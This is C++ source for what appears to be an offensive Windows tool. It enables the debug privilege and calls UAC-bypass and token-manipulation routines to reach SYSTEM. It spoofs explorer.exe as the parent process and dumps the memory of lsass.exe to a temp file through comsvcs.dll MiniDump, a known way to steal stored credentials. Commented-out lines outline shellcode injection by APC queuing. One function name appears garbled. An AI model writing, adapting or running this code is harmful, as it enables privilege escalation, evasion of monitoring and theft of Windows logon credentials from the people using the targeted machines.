#include "pch.h"
int main()
{
	SePrivTokenrivilege(GetCurrentThreadToken(), SE_DEBUG_NAME, TRUE);

	if (IsAdmin()==FALSE)
	{
		BypassUacRestart();
	}
	else {
		if (CurrentUserIsLocalSystem()==FALSE)
		{
			TokenManipulationRestart();
		}
		else {
            STARTUPINFOEXA siex = { 0 };
            PROCESS_INFORMATION piex = { 0 };
            SIZE_T sizeT;
            HANDLE hSystemToken = NULL;
            OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hSystemToken);
            siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
            HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindProcessPID(L"explorer.exe"));
            InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
            InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
            //SetCurrentDirectoryA("C:\\Windows\\System32\\");
            char cmd[256] = { 0 };
            DWORD LsassPid = FindProcessPID(L"lsass.exe");
            sprintf_s(cmd, "rundll32 C:\\windows\\system32\\comsvcs.dll,MiniDump %d c:\\windows\\temp\\lsass.dmp full", LsassPid);
            
            CreateProcessAsUserA(hSystemToken, NULL,
                //CreateProcessAsUserA(hSystemToken, "C:\\Windows\\System32\\svchost.exe",
                cmd
                , NULL, NULL, TRUE,
                //CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                EXTENDED_STARTUPINFO_PRESENT,
                NULL,
                NULL,
                (LPSTARTUPINFOA)&siex,
                &piex);
            // LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             //ret = GetLastError();
             //WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
             //QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
             //ResumeThread(piex.hThread);
            CloseHandle(piex.hThread);
            return 0;
		}
	}
}
